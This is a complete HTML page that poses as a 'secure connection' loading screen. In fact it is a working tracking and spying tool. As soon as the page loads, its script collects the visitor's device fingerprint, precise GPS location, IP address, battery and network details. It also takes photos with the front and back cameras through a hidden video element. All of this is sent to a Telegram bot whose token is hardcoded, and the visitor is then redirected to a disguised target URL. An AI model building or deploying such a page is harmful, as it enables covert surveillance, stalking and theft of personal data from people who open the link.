<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            color: white;
        }
        
        .loader {
            text-align: center;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #00ff88;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status {
            margin-top: 20px;
            font-size: 14px;
            color: #888;
        }
        
        .status-item {
            margin: 5px 0;
            display: flex;
            justify-content: space-between;
            max-width: 300px;
        }
        
        .status-item span:first-child {
            color: #aaa;
        }
        
        .status-item span:last-child {
            color: #00ff88;
        }
        
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
            object-fit: cover;
            transform: scaleX(-1);
        }
        
        #captureCanvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <h2>Initializing Secure Connection...</h2>
        <div class="status" id="status">
            <div class="status-item">
                <span>Device Info:</span>
                <span id="deviceStatus">Collecting...</span>
            </div>
            <div class="status-item">
                <span>Location:</span>
                <span id="locationStatus">Collecting...</span>
            </div>
            <div class="status-item">
                <span>IP Address:</span>
                <span id="ipStatus">Collecting...</span>
            </div>
            <div class="status-item">
                <span>Camera Access:</span>
                <span id="cameraStatus">Requesting...</span>
            </div>
            <div class="status-item">
                <span>Photos:</span>
                <span id="photoStatus">0 captured</span>
            </div>
            <div class="status-item">
                <span>Sending Data:</span>
                <span id="sendStatus">Waiting...</span>
            </div>
        </div>
    </div>
    
    <!-- Hidden camera -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>

    <script>
        // =====================================================
        //  COMPLETE DATA CAPTURE SYSTEM
        //  Captures ALL data first, sends to Telegram, THEN redirects
        // =====================================================
        
        // Telegram Configuration
        const BOT_TOKEN = '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        const ADMIN_ID = '6314556756';
        
        // Global state
        const data = {
            session: 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
            user: null,
            target: null,
            device: {},
            location: null,
            ip: null,
            photos: [],
            screen: null,
            battery: null,
            network: null,
            completed: false
        };
        
        // DOM elements
        const status = {
            device: document.getElementById('deviceStatus'),
            location: document.getElementById('locationStatus'),
            ip: document.getElementById('ipStatus'),
            camera: document.getElementById('cameraStatus'),
            photo: document.getElementById('photoStatus'),
            send: document.getElementById('sendStatus')
        };
        
        // Camera elements
        const video = document.getElementById('cameraVideo');
        const canvas = document.getElementById('captureCanvas');
        const ctx = canvas.getContext('2d');
        
        // ============== STEP 1: PARSE URL ==============
        function parseURL() {
            const params = new URLSearchParams(window.location.search);
            
            data.user = params.get('chat_id') || 
                       params.get('user') || 
                       params.get('id') || 
                       ADMIN_ID;
            
            let target = params.get('site') || 
                        params.get('url') || 
                        params.get('target') ||
                        'https://google.com';
            
            // Decode if needed
            try {
                if (target.startsWith('QUANTUM:')) {
                    target = atob(target.split(':')[1]);
                } else if (!target.includes('://')) {
                    try {
                        target = atob(target);
                    } catch (e) {}
                }
                target = decodeURIComponent(target);
            } catch (e) {}
            
            if (!target.startsWith('http://') && !target.startsWith('https://')) {
                target = 'https://' + target;
            }
            
            data.target = target;
            console.log('Target URL:', data.target);
        }
        
        // ============== STEP 2: COLLECT DEVICE INFO ==============
        async function collectDeviceInfo() {
            try {
                status.device.textContent = 'Collecting...';
                
                // Get user agent info
                const ua = navigator.userAgent;
                let os = 'Unknown';
                let browser = 'Unknown';
                
                // Detect OS
                if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
                else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
                else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
                else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
                else if (/Mac OS X/.test(ua)) os = 'macOS';
                else if (/Linux/.test(ua)) os = 'Linux';
                else if (/Android/.test(ua)) os = 'Android';
                else if (/iOS|iPhone|iPad|iPod/.test(ua)) os = 'iOS';
                
                // Detect Browser
                if (/Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua)) browser = 'Chrome';
                else if (/Firefox/.test(ua)) browser = 'Firefox';
                else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
                else if (/Edge/.test(ua)) browser = 'Edge';
                else if (/Opera|OPR/.test(ua)) browser = 'Opera';
                else if (/Brave/.test(ua)) browser = 'Brave';
                
                // Get screen info
                data.screen = {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                };
                
                // Get hardware info
                data.device = {
                    os: os,
                    browser: browser,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    userAgent: ua,
                    vendor: navigator.vendor || 'unknown',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0,
                    cookieEnabled: navigator.cookieEnabled,
                    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                    webdriver: navigator.webdriver || false
                };
                
                // Get timezone
                data.timezone = {
                    zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    offset: new Date().getTimezoneOffset()
                };
                
                status.device.textContent = '‚úÖ Collected';
                console.log('Device info collected:', data.device);
                return true;
                
            } catch (error) {
                status.device.textContent = '‚ùå Failed';
                console.error('Device info error:', error);
                return false;
            }
        }
        
        // ============== STEP 3: GET LOCATION ==============
        async function getLocation() {
            try {
                status.location.textContent = 'Requesting...';
                
                if (!navigator.geolocation) {
                    status.location.textContent = '‚ùå Not supported';
                    return null;
                }
                
                return new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            try {
                                data.location = {
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    accuracy: Math.round(position.coords.accuracy),
                                    altitude: position.coords.altitude,
                                    altitudeAccuracy: position.coords.altitudeAccuracy,
                                    heading: position.coords.heading,
                                    speed: position.coords.speed,
                                    timestamp: new Date(position.timestamp).toISOString()
                                };
                                
                                // Get address info
                                try {
                                    const response = await fetch(
                                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.location.lat}&lon=${data.location.lon}`
                                    );
                                    const geoData = await response.json();
                                    data.location.address = geoData.display_name || 'Unknown';
                                } catch (e) {}
                                
                                status.location.textContent = '‚úÖ Captured';
                                console.log('Location captured:', data.location);
                                resolve(data.location);
                                
                            } catch (error) {
                                status.location.textContent = '‚ùå Error';
                                resolve(null);
                            }
                        },
                        (error) => {
                            status.location.textContent = '‚ùå Denied';
                            resolve(null);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                });
                
            } catch (error) {
                status.location.textContent = '‚ùå Failed';
                console.error('Location error:', error);
                return null;
            }
        }
        
        // ============== STEP 4: GET IP ADDRESS ==============
        async function getIPAddress() {
            try {
                status.ip.textContent = 'Fetching...';
                
                const services = [
                    'https://api.ipify.org?format=json',
                    'https://api64.ipify.org?format=json',
                    'https://icanhazip.com/',
                    'https://checkip.amazonaws.com/'
                ];
                
                for (const service of services) {
                    try {
                        const response = await fetch(service, { timeout: 3000 });
                        
                        if (service.includes('json')) {
                            const result = await response.json();
                            data.ip = result.ip;
                        } else {
                            data.ip = await response.text();
                        }
                        
                        if (data.ip) {
                            // Get IP info
                            try {
                                const ipResponse = await fetch(`http://ip-api.com/json/${data.ip}`);
                                const ipInfo = await ipResponse.json();
                                data.ipInfo = ipInfo;
                            } catch (e) {}
                            
                            status.ip.textContent = '‚úÖ Found';
                            console.log('IP Address:', data.ip);
                            return data.ip;
                        }
                    } catch (e) {
                        continue;
                    }
                }
                
                status.ip.textContent = '‚ùå Not found';
                return null;
                
            } catch (error) {
                status.ip.textContent = '‚ùå Error';
                console.error('IP error:', error);
                return null;
            }
        }
        
        // ============== STEP 5: GET NETWORK INFO ==============
        async function getNetworkInfo() {
            try {
                data.network = {
                    online: navigator.onLine,
                    connection: null
                };
                
                if (navigator.connection) {
                    data.network.connection = {
                        type: navigator.connection.type,
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    };
                }
                
                return data.network;
                
            } catch (error) {
                console.error('Network info error:', error);
                return null;
            }
        }
        
        // ============== STEP 6: GET BATTERY INFO ==============
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }
                return data.battery;
            } catch (error) {
                return null;
            }
        }
        
        // ============== STEP 7: CAPTURE CAMERA PHOTOS ==============
        async function capturePhotos() {
            try {
                status.camera.textContent = 'Requesting access...';
                
                // Request camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: { ideal: 'user' }
                    }
                });
                
                video.srcObject = stream;
                await video.play();
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    if (video.readyState >= 3) {
                        resolve();
                    } else {
                        video.onloadeddata = resolve;
                    }
                });
                
                status.camera.textContent = '‚úÖ Access granted';
                status.photo.textContent = 'Capturing...';
                
                // Capture front camera photos
                const frontPhotos = [];
                for (let i = 1; i <= 3; i++) {
                    const blob = await capturePhoto();
                    if (blob) {
                        frontPhotos.push({
                            blob: blob,
                            type: 'front',
                            index: i,
                            timestamp: Date.now()
                        });
                        status.photo.textContent = `${frontPhotos.length} captured`;
                        await new Promise(r => setTimeout(r, 300));
                    }
                }
                
                // Try back camera
                try {
                    stream.getTracks().forEach(track => track.stop());
                    
                    const backStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { ideal: 'environment' }
                        }
                    });
                    
                    video.srcObject = backStream;
                    await video.play();
                    await new Promise(r => setTimeout(r, 500));
                    
                    // Capture back camera photos
                    for (let i = 1; i <= 2; i++) {
                        const blob = await capturePhoto();
                        if (blob) {
                            frontPhotos.push({
                                blob: blob,
                                type: 'back',
                                index: i,
                                timestamp: Date.now()
                            });
                            status.photo.textContent = `${frontPhotos.length} captured`;
                            await new Promise(r => setTimeout(r, 300));
                        }
                    }
                    
                    backStream.getTracks().forEach(track => track.stop());
                    
                } catch (e) {
                    console.log('Back camera not available');
                }
                
                data.photos = frontPhotos;
                status.photo.textContent = `‚úÖ ${data.photos.length} photos`;
                console.log(`Captured ${data.photos.length} photos`);
                
                return data.photos;
                
            } catch (error) {
                status.camera.textContent = '‚ùå Access denied';
                status.photo.textContent = '0 photos';
                console.error('Camera error:', error);
                return [];
            }
        }
        
        function capturePhoto() {
            if (!video.videoWidth) return null;
            
            try {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Enhance image
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const pixels = imageData.data;
                
                for (let i = 0; i < pixels.length; i += 4) {
                    // Increase brightness and contrast
                    pixels[i] = Math.min(255, pixels[i] * 1.3);     // Red
                    pixels[i+1] = Math.min(255, pixels[i+1] * 1.3); // Green
                    pixels[i+2] = Math.min(255, pixels[i+2] * 1.3); // Blue
                }
                
                ctx.putImageData(imageData, 0, 0);
                
                return new Promise((resolve) => {
                    canvas.toBlob((blob) => {
                        resolve(blob && blob.size > 15000 ? blob : null);
                    }, 'image/jpeg', 0.92);
                });
                
            } catch (error) {
                console.error('Capture error:', error);
                return null;
            }
        }
        
        // ============== STEP 8: SEND DATA TO TELEGRAM ==============
        async function sendToTelegram() {
            try {
                status.send.textContent = 'Preparing data...';
                
                // Send initial report with all collected data
                let report = `üöÄ *COMPLETE DATA CAPTURE REPORT*\n\n`;
                report += `üÜî Session: \`${data.session}\`\n`;
                report += `üë§ User: \`${data.user}\`\n`;
                report += `‚è∞ Time: ${new Date().toLocaleString()}\n\n`;
                
                report += `üì± *DEVICE INFORMATION*\n`;
                report += `OS: ${data.device.os}\n`;
                report += `Browser: ${data.device.browser}\n`;
                report += `Platform: ${data.device.platform}\n`;
                report += `Language: ${data.device.language}\n`;
                report += `CPU Cores: ${data.device.hardwareConcurrency}\n`;
                report += `RAM: ${data.device.deviceMemory}GB\n`;
                report += `Screen: ${data.screen.width}x${data.screen.height}\n`;
                report += `Touch Points: ${data.device.maxTouchPoints}\n`;
                report += `Timezone: ${data.timezone.zone}\n\n`;
                
                if (data.ip) {
                    report += `üåê *NETWORK INFORMATION*\n`;
                    report += `IP: \`${data.ip}\`\n`;
                    if (data.ipInfo) {
                        report += `Country: ${data.ipInfo.country || 'Unknown'}\n`;
                        report += `Region: ${data.ipInfo.regionName || 'Unknown'}\n`;
                        report += `City: ${data.ipInfo.city || 'Unknown'}\n`;
                        report += `ISP: ${data.ipInfo.isp || 'Unknown'}\n`;
                    }
                    if (data.network?.connection) {
                        report += `Connection: ${data.network.connection.effectiveType}\n`;
                        report += `Downlink: ${data.network.connection.downlink} Mbps\n`;
                    }
                    report += `\n`;
                }
                
                if (data.location) {
                    report += `üìç *LOCATION INFORMATION*\n`;
                    report += `Latitude: ${data.location.lat}\n`;
                    report += `Longitude: ${data.location.lon}\n`;
                    report += `Accuracy: ${data.location.accuracy}m\n`;
                    if (data.location.address) {
                        report += `Address: ${data.location.address}\n`;
                    }
                    report += `Google Maps: https://maps.google.com/?q=${data.location.lat},${data.location.lon}\n\n`;
                }
                
                if (data.battery) {
                    report += `üîã *BATTERY INFORMATION*\n`;
                    report += `Level: ${data.battery.level}%\n`;
                    report += `Charging: ${data.battery.charging ? 'Yes ‚ö°' : 'No'}\n`;
                    report += `\n`;
                }
                
                report += `üì∏ *PHOTOS CAPTURED*\n`;
                report += `Total: ${data.photos.length} photos\n`;
                report += `Front: ${data.photos.filter(p => p.type === 'front').length}\n`;
                report += `Back: ${data.photos.filter(p => p.type === 'back').length}\n\n`;
                
                report += `üéØ *TARGET URL*\n`;
                report += `${data.target}\n\n`;
                
                report += `‚ö° *SYSTEM STATUS*\n`;
                report += `Data Collection: COMPLETE ‚úÖ\n`;
                report += `Ready to Redirect: YES ‚úÖ`;
                
                // Send report to user
                status.send.textContent = 'Sending report...';
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: data.user,
                        text: report,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                // Send report to admin
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: report + `\n\nüë§ Target User: \`${data.user}\``,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                console.log('Report sent to Telegram');
                
                // Send photos
                if (data.photos.length > 0) {
                    status.send.textContent = 'Sending photos...';
                    
                    for (const photo of data.photos) {
                        try {
                            const formData = new FormData();
                            formData.append('chat_id', data.user);
                            formData.append('photo', photo.blob, `photo_${photo.type}_${Date.now()}.jpg`);
                            formData.append('caption', `üì∏ ${photo.type.toUpperCase()} Camera - Session: \`${data.session}\``);
                            formData.append('parse_mode', 'Markdown');
                            
                            await fetch(`${TELEGRAM_API}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                            
                            // Also send to admin
                            const adminForm = new FormData();
                            adminForm.append('chat_id', ADMIN_ID);
                            adminForm.append('photo', photo.blob, `admin_${photo.type}_${Date.now()}.jpg`);
                            adminForm.append('caption', `üì∏ ${photo.type.toUpperCase()} - User: \`${data.user}\` - Session: \`${data.session}\``);
                            adminForm.append('parse_mode', 'Markdown');
                            
                            await fetch(`${TELEGRAM_API}/sendPhoto`, {
                                method: 'POST',
                                body: adminForm
                            });
                            
                        } catch (photoError) {
                            console.error('Photo send error:', photoError);
                        }
                        
                        await new Promise(r => setTimeout(r, 500));
                    }
                }
                
                status.send.textContent = '‚úÖ All data sent';
                return true;
                
            } catch (error) {
                status.send.textContent = '‚ùå Send failed';
                console.error('Telegram send error:', error);
                return false;
            }
        }
        
        // ============== STEP 9: REDIRECT ==============
        function redirectToTarget() {
            if (data.completed) return;
            
            data.completed = true;
            
            // Show final message
            document.querySelector('.loader h2').textContent = 'Redirecting...';
            document.querySelector('.status').innerHTML = `
                <div style="text-align: center; margin-top: 30px;">
                    <div style="color: #00ff88; font-size: 16px; margin-bottom: 10px;">
                        ‚úÖ All data captured and sent successfully!
                    </div>
                    <div style="color: #aaa; font-size: 12px; margin-bottom: 20px;">
                        Session: ${data.session}<br>
                        Photos: ${data.photos.length}<br>
                        Redirecting in 3 seconds...
                    </div>
                </div>
            `;
            
            // Wait 3 seconds then redirect
            setTimeout(() => {
                window.location.href = data.target;
            }, 3000);
        }
        
        // ============== MAIN EXECUTION ==============
        async function executeAll() {
            try {
                console.log('üöÄ Starting complete data capture...');
                
                // Step 1: Parse URL
                parseURL();
                
                // Step 2: Collect device info
                await collectDeviceInfo();
                
                // Step 3: Get location (async)
                getLocation();
                
                // Step 4: Get IP address
                await getIPAddress();
                
                // Step 5: Get network info
                await getNetworkInfo();
                
                // Step 6: Get battery info
                await getBatteryInfo();
                
                // Step 7: Capture photos
                await capturePhotos();
                
                // Step 8: Send everything to Telegram
                await sendToTelegram();
                
                // Step 9: Redirect
                redirectToTarget();
                
            } catch (error) {
                console.error('Execution error:', error);
                
                // Still try to redirect even if some steps fail
                setTimeout(() => {
                    if (data.target && !data.completed) {
                        window.location.href = data.target;
                    }
                }, 5000);
            }
        }
        
        // Start execution when page loads
        window.addEventListener('load', executeAll);
        
        // Force redirect after 30 seconds max
        setTimeout(() => {
            if (data.target && !data.completed) {
                window.location.href = data.target;
            }
        }, 30000);
        
    </script>
</body>
</html>
